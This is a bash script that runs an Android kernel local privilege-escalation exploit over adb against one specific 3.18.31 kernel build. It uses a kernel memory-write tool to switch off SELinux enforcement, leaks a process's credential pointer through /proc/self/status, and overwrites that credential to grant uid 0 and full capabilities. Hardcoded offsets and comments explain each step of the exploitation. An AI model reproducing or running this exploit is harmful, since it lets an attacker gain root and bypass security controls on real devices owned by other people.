#!/usr/bin/env bash
# Read the child's own cred pointer out of /proc/self/status, patch THAT cred in place, and see
# whether a uid-0 task that keeps its own SELinux domain survives.
#
# Why this exists: ledger 491 killed the "borrow init_cred" route -- pointing task->cred at
# init_cred hands the task scontext=u:r:kernel:s0, and this firmware silently executes that task at
# its next path-lookup open / fork / setresuid / execve (exit status 0, no oops, no debuggerd).  The
# delivery needs uid 0 *inside the target's own domain*, i.e. an in-place edit of the cred object the
# task already owns, and for that we need the value of `task->cred`.
#
# The read channel is the kernel's own status printer, not a new primitive:
#   proc_pid_status+0x428  `ldr x0, [x20, #0x658]`   ->  it formats from task->real_cred,
#   while getuid()/geteuid()/getgid() read task->cred (+0x4c0).
# So one 8-byte write of `real_cred` = task + 0x4bc makes /proc/self/status print the 72 bytes
# starting at task+0x4c0: `Uid:` carries +0x04..+0x13 and `Gid:` +0x14..+0x23, which is exactly the
# cred pointer (low word then high word -- and a kernel VA in this band must have 0xffffffc0 as its
# high word, so the read proves itself).  `task->cred` is never touched, so the task keeps working
# while it is being used as a window, and `real_cred` is restored to the true cred value at the end
# so exit_creds()'s two put_cred() calls land where they belong.
#
# Calibration before conclusions (ledger 478: never trust the writer's byte count):
#   A. baseline status must print uid 2000 / CapBnd 0xc0 -- the reader works;
#   B. after redirecting real_cred, `Uid:`+`Gid:` must decode to a 0xffffffc0xxxxxxxx pointer;
#   C. pointing real_cred at (cred - 4) must print the SAME template the baseline showed
#      (uid 2000 and the four cap words) -- that is what says the object is really this task's cred,
#      not just a plausible number;
#   D. only then the in-place patch: 8 ids to 0 and cap_permitted/effective/bset to 0x3fffffffff
#      (_CAP_LAST_CAP=39; all-ones would be wrong and is why an earlier shape scan found nothing).
# Acceptance is the child's own ladder: open("/dev/null") must return an fd and execve must produce a
# process that reports uid 0.  If instead it dies the way the init_cred copy did, the guard keys on
# uid 0 itself and not on the domain -- that is a finding, not a failure, and it is reported as one.
#
# Memory state only: adb reboot restores factory.
set -eu
set -o pipefail

ROOT=$(cd "$(dirname "$0")" && pwd)
SER=${SER:-$(adb devices | awk 'NR==2 && $2=="device"{print $1}')}
ADB="adb -s $SER"
DEV=/data/local/tmp
OUT=$DEV/cred.txt
WFILE=$DEV/wexec.txt
LOCAL=/tmp/wexec-read.txt

KREL=$($ADB shell uname -r 2>/dev/null | tr -d '\r')
case "$KREL" in
  3.18.31-perf-g9dce1fbc9*)
    SELINUX_ENFORCING=0xffffffc001d5dbe4
    OFF_TASK_CRED=0x4c0; OFF_TASK_REALCRED=0x658; OFF_TASK_PRIO=0x54 ;;
  *) printf 'ABORT: kernel %s has no verified profile\n' "$KREL" >&2; exit 1 ;;
esac

ROUNDS=${ROUNDS:-10}
HOLD=${HOLD:-420}
NICE=${NICE:-7}
WKIDS=${WKIDS:-6}
addr_add() { python3 -c "import sys; print(hex(int(sys.argv[1],16) + int(sys.argv[2],16)))" "$1" "$2"; }
le64_hex() { python3 -c "import sys; print(int(sys.argv[1],16).to_bytes(8,'little').hex())" "$1"; }

fire() {
	local i
	for i in 1 2 3; do
		if $ADB shell "$DEV/clobber 14 kern $1 hex:$2 4 0" 2>&1 | tr -d '\r' | grep -q 'CLOBBER OK'; then
			printf '  write %-22s <- %-34s : OK (try %d)\n' "$1" "$2" "$i"
			return 0
		fi
	done
	printf '  write %s <- %s : no hit in three batches\n' "$1" "$2" >&2
	return 1
}

pull() { $ADB pull $WFILE $LOCAL >/dev/null 2>&1 || true; }
# The newest complete status block the child dumped through its pre-opened fd (device sh has no awk,
# so this parses the pulled copy).
newest_status() { python3 -c "
import re
t=open('/tmp/wexec-read.txt','rb').read().decode('utf-8','replace')
blocks=re.findall(r'STATUS_BEGIN\n(.*?)STATUS_END', t, re.S)
print(blocks[-1] if blocks else '')
"; }

for f in broot clobber; do
	[ -x "$ROOT/$f" ] || { printf 'ABORT: build %s first\n' "$f" >&2; exit 1; }
done
grep -aq 'STATUS_BEGIN' "$ROOT/broot" || { printf 'ABORT: %s/broot predates the status read channel\n' "$ROOT" >&2; exit 1; }
for f in broot clobber; do
	$ADB push "$ROOT/$f" "$DEV/$f" >/dev/null 2>&1 || { printf 'ABORT: push %s\n' "$f" >&2; exit 1; }
	$ADB shell chmod 0755 "$DEV/$f" >/dev/null
done

printf 'kernel %s  rounds=%s hold=%s kids=%s\n' "$KREL" "$ROUNDS" "$HOLD" "$WKIDS"
if ! $ADB shell getenforce 2>/dev/null | tr -d '\r' | grep -q Permissive; then
	fire "$SELINUX_ENFORCING" 00000000 || exit 1
	printf '  getenforce now: %s\n' "$($ADB shell getenforce 2>/dev/null | tr -d '\r')"
fi

printf '\n=== 1. name a child task (planted pid+nice, agreement across binder_procs) ===\n'
$ADB shell "rm -f $OUT $WFILE; cd $DEV; SPAN=0x400000 SIG=1 NICE=$NICE WCHILD=8 WKIDS=$WKIDS CHURN=20 BPFDS=6 PERROUND=3 HOLD=$HOLD setsid nohup $DEV/broot $ROUNDS > $OUT 2>&1 < /dev/null &" >/dev/null 2>&1
LINE=""
for _ in $(seq 1 $((ROUNDS * 12))); do
	LINE=$($ADB shell "grep -m1 -oE 'TASKVA=0x[0-9a-f]+ pid=[0-9]+.*' $OUT 2>/dev/null" | tr -d '\r') || true
	[ -n "$LINE" ] && break
	sleep 4
done
[ -n "$LINE" ] || { printf 'ABORT: needle never agreed; scan lines:\n' >&2; $ADB shell "grep -E 'WCHILD|scan_sigs:|PROC cand|named by' $OUT" 2>&1 | tr -d '\r' | tail -n 12 >&2; exit 1; }
printf '  %s\n' "$LINE"
TASK=$(sed 's/^TASKVA=//; s/ .*//' <<<"$LINE")
KID=$(sed 's/.* pid=//; s/ .*//' <<<"$LINE")
printf '  target task=%s pid=%s\n' "$TASK" "$KID"

printf '\n=== 2. baseline: the child prints its own cred through the pre-opened fd ===\n'
for _ in $(seq 1 40); do pull; [ -n "$(newest_status)" ] && break; sleep 2; done
printf '%s\n' "$(newest_status)" | grep -E '^(Name|Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|Se)' || { printf 'ABORT: no status block yet\n' >&2; exit 1; }

printf '\n=== 3. probe A: point real_cred at task+0x4bc and read out task->cred ===\n'
fire "$(addr_add "$TASK" $OFF_TASK_REALCRED)" "$(le64_hex $(addr_add "$TASK" 0x4bc))" || exit 1
sleep 6; pull
printf '%s\n' "$(newest_status)" | grep -E '^(Uid|Gid|CapBnd)' || true
read -r CREDVA <<<"$(python3 -c "
import re
t=open('/tmp/wexec-read.txt','rb').read().decode('utf-8','replace')
b=re.findall(r'STATUS_BEGIN\n(.*?)STATUS_END', t, re.S)[-1]
u=[int(x,10) for x in re.search(r'^Uid:\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)',b,re.M).groups()]
g=[int(x,10) for x in re.search(r'^Gid:\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)',b,re.M).groups()]
lo,hi=u[0],u[1]
v=(hi<<32)|lo
print(hex(v))
")"
printf '  decoded task->cred = %s\n' "$CREDVA"
python3 -c "
import sys
v=int(sys.argv[1],16)
if not (0xffffffc000000000 <= v < 0xffffffd000000000):
    print('  ABORT: decoded value is not a kernel VA in this band -> the read channel is lying'); sys.exit(1)
print('  plausible kernel VA in the image/slab band -> accepted')
" "$CREDVA"

printf '\n=== 4. probe B: point real_cred at (cred-4); the template must come back ===\n'
fire "$(addr_add "$TASK" $OFF_TASK_REALCRED)" "$(le64_hex "$(addr_add "$CREDVA" -4)")" || exit 1
sleep 6; pull
printf '%s\n' "$(newest_status)" | grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd)' || true
printf '  (must equal the baseline above: same 8 ids, same four cap words -- that is what says this\n'
printf '   object really is the cred of this task, and not a number that merely looks like one)\n'

printf '\n=== 5. patch that cred in place: ids to 0, cap_permitted/effective/bset to the full set ===\n'
fire "$(addr_add "$CREDVA" 0x04)" "$(python3 -c "print('00'*32)")" || exit 1
fire "$(addr_add "$CREDVA" 0x30)" "$(python3 -c "print(('ff'*5+'3f'+'00'*2)*3)")" || exit 1
printf '  restore real_cred to the true cred so exit_creds() lands on the right object\n'
fire "$(addr_add "$TASK" $OFF_TASK_REALCRED)" "$(le64_hex "$CREDVA")" || exit 1

printf '\n=== 6. witness: the child answers, then runs the ladder and the exec ===\n'
for _ in $(seq 1 $((HOLD / 4 + 30))); do
	$ADB shell "grep -qE 'ladder-open-devnull-rc|EXEC uid=|execl-FAILED|broken' $WFILE" >/dev/null 2>&1 && break || true
	sleep 4
done
pull
$ADB shell "grep -vE '^STATUS_' $WFILE 2>/dev/null | tail -n 20" 2>&1 | tr -d '\r' || true
printf '\n--- last status block the child printed ---\n'
printf '%s\n' "$(newest_status)" | grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|Se|NSpid)' || true
printf '\n=== 7. external witnesses ===\n'
$ADB shell "ls -ld /proc/$KID 2>&1" 2>&1 | tr -d '\r' || true
$ADB shell "ps -A -o USER,PID,NAME 2>/dev/null | grep -w $KID" 2>&1 | tr -d '\r' || true
$ADB shell "dmesg | grep -cE 'Internal error|Oops|BUG:|kernel panic|Unable to handle|tainted'" 2>&1 | tr -d '\r' | sed 's/^/  kernel fault lines: /' || true
